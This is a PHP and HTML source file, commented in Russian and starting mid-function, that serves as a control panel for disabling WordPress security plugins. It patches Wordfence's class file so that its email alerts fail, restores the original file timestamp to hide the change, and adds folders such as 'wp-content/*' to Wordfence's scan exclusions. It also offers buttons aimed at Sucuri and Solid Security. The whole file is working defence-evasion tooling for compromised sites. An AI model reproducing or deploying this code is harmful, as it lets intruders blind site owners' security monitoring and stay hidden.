		$wordfenceClassPath = WP_CONTENT_DIR . '/plugins/wordfence/lib/wordfenceClass.php';

		// Создаём резервную копию файла
		backupFile($wordfenceClassPath);

		// Сохраняем время модификации исходного файла
		if (file_exists($wordfenceClassPath)) {
			$fileModificationTime = filemtime($wordfenceClassPath);
		} else {
			echo "Файл wordfenceClass.php не найден.\n<br>";
			return;
		}

		// Читаем файл построчно
		$lines = file($wordfenceClassPath);

		// Флаг для отслеживания, найдена ли строка с wp_mail
		$wpMailFound = false;

		// Проходим по всем строкам файла
		foreach ($lines as $index => $line) {
			// Ищем строку с wp_mail
			if (strpos($line, 'wp_mail($email, $subject, $uniqueContent);') !== false) {
				$wpMailFound = true;

				// Начинаем поиск следующей строки с "return true;"
				for ($i = $index + 1; $i < count($lines); $i++) {
					if (strpos(trim($lines[$i]), 'return true;') !== false) {
						// Заменяем "return true;" на "return false;"
						$lines[$i] = 'return false;' . PHP_EOL;
						file_put_contents($wordfenceClassPath, implode('', $lines)); // Записываем обратно в файл

						// Восстанавливаем время модификации файла
						touch($wordfenceClassPath, $fileModificationTime);

						echo basename($wordfenceClassPath) . " - Изменение успешно выполнено.\n<br>";
						break; // Прерываем цикл после изменения
					}
				}

				break; // Прерываем цикл, так как нужная строка найдена и обработана
			}
		}

		if (!$wpMailFound) {
			echo basename($wordfenceClassPath) . " - Строка с 'wp_mail(\$email, \$subject, \$uniqueContent);' не найдена.\n";
		}

		// Выводим сообщения о резервных копиях после всех изменений
		if (!empty($backupMessages)) {
			echo implode('', $backupMessages);
		}
	}
	
	//
	//Для вставки исключений в WordFence
	//
	define('WP_USE_THEMES', false);

	global $wpdb;
	$table = $wpdb->prefix . 'wfconfig';
	$message = '';
	$current_excludes = [];

	// Получаем текущие исключения (если есть)
	$existing_row = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table WHERE name = %s", 'scan_exclude'));
	if ($existing_row && isset($existing_row->val)) {
		// Преобразуем бинарные данные в строку и разделяем по строкам
		$current_excludes = preg_split('/\r\n|\r|\n/', $existing_row->val, -1, PREG_SPLIT_NO_EMPTY);
	}

	if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['add_exclude']) && isset($_POST['folders'])) {
		// Важно! Подключаем WordPress для работы с $wpdb
		require_once($wp_root . 'wp-load.php');
		define('WP_USE_THEMES', false);

		global $wpdb;
		$table = $wpdb->prefix . 'wfconfig';
		$message = '';
		$current_excludes = [];

		// Получаем текущие исключения (если есть)
		$existing_row = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table WHERE name = %s", 'scan_exclude'));
		if ($existing_row && isset($existing_row->val)) {
			$current_excludes = preg_split('/\r\n|\r|\n/', $existing_row->val, -1, PREG_SPLIT_NO_EMPTY);
		}

		$folders = preg_split('/\r\n|\r|\n/', $_POST['folders']);
		$folders = array_map('trim', $folders);
		$folders = array_filter($folders, function($v) { return $v !== ''; });

		$new_excludes = $current_excludes;
		$added = [];
		foreach ($folders as $folder) {
			if (!in_array($folder, $current_excludes, true)) {
				$new_excludes[] = $folder;
				$added[] = $folder;
			}
		}

		if (count($added) > 0) {
			$save_val = implode("\n", $new_excludes);

			if ($existing_row) {
				$result = $wpdb->update(
					$table,
					array('val' => $save_val, 'autoload' => 'yes'),
					array('name' => 'scan_exclude'),
					array('%s', '%s'),
					array('%s')
				);
				$message = $result !== false
					? 'Добавлено в исключения: <code>' . htmlspecialchars(implode(', ', $added)) . '</code>'
					: 'Ошибка при обновлении исключений: ' . $wpdb->last_error;
			} else {
				$result = $wpdb->insert(
					$table,
					array(
						'name'     => 'scan_exclude',
						'val'      => $save_val,
						'autoload' => 'yes'
					),
					array('%s', '%s', '%s')
				);
				$message = $result
					? 'Добавлено в исключения: <code>' . htmlspecialchars(implode(', ', $added)) . '</code>'
					: 'Ошибка при добавлении исключений: ' . $wpdb->last_error;
			}
			$current_excludes = $new_excludes;
		} else {
			$message = 'Все введённые папки уже есть в списке исключений.';
		}

		echo '<div>' . $message . '</div>';
		echo '<div class="current-list"><strong>Текущий список исключённых папок:</strong><ul>';
		foreach ($current_excludes as $exc) {
			echo '<li><code>' . htmlspecialchars($exc) . '</code></li>';
		}
		echo '</ul></div>';
		exit();
	}
	//
	//Конец блока Для вставки исключений в WordFence
	//
	
	
	
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Input</title>
    <style>
		body {padding: 25px 25px;}
        button { padding: 10px; margin: 10px 0; width: 250px; cursor: pointer;}
		input {
			width: 285px;
			height: 20px;
			border: 1px solid #000;
			border-radius: 5px;
			background-color: buttonface;
			margin-top: 10px;
			padding: 10px;
		}
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: none;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
		textarea { width: 250px; height: 120px; }
        code { background: #eee; padding: 2px 4px; border-radius: 3px; }
        .current-list { margin: 1em 0 2em 0; }
    </style>
    <script>
        async function performActionAnt(action) {
            const spinner = document.getElementById('spinner');
            const resultDiv = document.getElementById('result');
            const ipAddresses = document.getElementById('ipAddresses').value;

            // Показываем спиннер
            spinner.style.display = 'block';
            resultDiv.innerHTML = ''; // Очищаем предыдущий результат

            try {
                const formData = new FormData();
                formData.append('ipAddresses', ipAddresses);
                formData.append('action', action);

                const response = await fetch('', {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error('Ошибка сети');
                }

                const result = await response.text();
                resultDiv.innerHTML = result;
            } catch (error) {
                console.error('Ошибка:', error);
                resultDiv.innerHTML = 'Произошла ошибка при выполнении запроса.';
            } finally {
                // Скрываем спиннер после завершения запроса
                spinner.style.display = 'none';
            }
        }
    </script>
</head>
<body>
	<button id="replaceParamBtn2"  style="width:250px; line-height:15px !important;background-color: #d0d5bc !important">Перейти на вкладку разброса</button>
	<script>
	const btn2 = document.getElementById('replaceParamBtn2');
	btn2.onclick = function() {
		const url = new URL(window.location.href);

		url.searchParams.delete('connect_ant');

		url.searchParams.set('connect', '1');

		window.location.href = url.href;
	};
	
	btn2.addEventListener('mouseover', function() {
		btn2.style.backgroundColor = '#c3cba5';
	});
	btn2.addEventListener('mouseout', function() {
		btn2.style.backgroundColor = '#d0d5bc';
	});	
	</script>
	<br>
	<br>
	
    <label for="ipAddresses">IP-адреса (через запятую):</label><br>
    <input type="text" id="ipAddresses" placeholder="154.26.129.209, 94.16.121.226, 127.0.0.1"><br><br>
	<div style="display: flex; flex-direction:row; gap: 55px">
		<div style="border: 1px solid #bbb; ;padding: 20px; width: 250px">
			<button type="button" onclick="performActionAnt('wordfence_toggle_email')">Отключить уведомления WordFence</button><br>	
			<button type="button" onclick="performActionAnt('wordfence')">WordFence</button>
			
			<?php if ($message): ?>
				<p><strong><?php echo $message; ?></strong></p>
			<?php endif; ?>

			<form id="excludeForm" onsubmit="return false;">
				<label for="folders">Папки для исключения (по одной на строку):</label><br>
				<textarea name="folders" id="folders" placeholder="wp-content/*&#10;wp-includes/*"></textarea><br><br>
				<button type="button" onclick="addExcludes()">Добавить в исключения</button>
			</form>
			
			<script>
			function addExcludes() {
				const spinner = document.getElementById('spinner');
				const resultDiv = document.getElementById('result');
				const folders = document.getElementById('folders').value;

				spinner && (spinner.style.display = 'block');
				resultDiv && (resultDiv.innerHTML = '');

				const formData = new FormData();
				formData.append('add_exclude', '1');
				formData.append('folders', folders);

				fetch('', {
					method: 'POST',
					body: formData
				})
				.then(r => r.text())
				.then(res => {
					resultDiv && (resultDiv.innerHTML = res);
				})
				.catch(err => {
					resultDiv && (resultDiv.innerHTML = 'Ошибка: ' + err);
				})
				.finally(() => {
					spinner && (spinner.style.display = 'none');
				});
			}
			</script>
			
			<div class="current-list">
				<strong>Текущий список исключённых папок:</strong>
				<ul>
					<?php foreach ($current_excludes as $exc): ?>
						<li><code><?php echo htmlspecialchars($exc); ?></code></li>
					<?php endforeach; ?>
				</ul>
			</div>
		</div>
		<div style="border: 1px solid #bbb; ;padding: 20px">
			<button type="button" onclick="performActionAnt('sucuri')">Sucuri</button><br>
		</div>
		<div style="border: 1px solid #bbb; ;padding: 20px">
			<h3>Для плагина Solid Security:</h3>
			<b>Сначала:</b>
			<p>1. Вкладка Settings (слева), Features -> колонка Site Check
			File Change:
			Выбрать папку для исключения от сканирования изменений. Сохранить</p>
			<p>2. только для вкладки Site Check.
			Вкладка Settings (слева), Features -> колонка Site Check
			File Change:
			Выбрать папку для исключения от сканирования изменений. Сохранить.</p>
			<b>Затем:</b>
			<p>3. Нажать кнопку Solid</p>
			<button type="button" onclick="performActionAnt('solid')">Solid</button>
		</div>
		<div style="border: 1px solid #bbb; ;padding: 20px">
			<h3>Для плагина ShieldPro:</h3>
		</div>
	</div>
	<p></p>
	<hr style="clear:both">
	<div style="display: flex; flex-direction:row; gap: 55px; justify-content: center;">
		<div>
			<button type="button" onclick="performActionAnt('delete_backups')">Удалить бэкапы</button>
		</div>
		<div>
			<button type="button" onclick="performActionAnt('restore_from_backups')">Восстановить из бэкапов</button>
		</div>
	</div>
		<div class="spinner" id="spinner"></div>
		<div id="result"></div>
	
	<script>
		document.querySelector('input').addEventListener('focusin', function() {
			document.querySelector('input').style.backgroundColor = '#fff';
			document.querySelector('input').placeholder = '';
		});
		document.querySelector('input').addEventListener('focusout', function() {
			if (!document.querySelector('input').value.trim()) {
				document.querySelector('input').style.backgroundColor = '#fff';
				document.querySelector('input').placeholder = '154.26.129.209, 94.16.121.226, 127.0.0.1';
			}
		});
	</script>
</body>
</html>
	<?php } ?>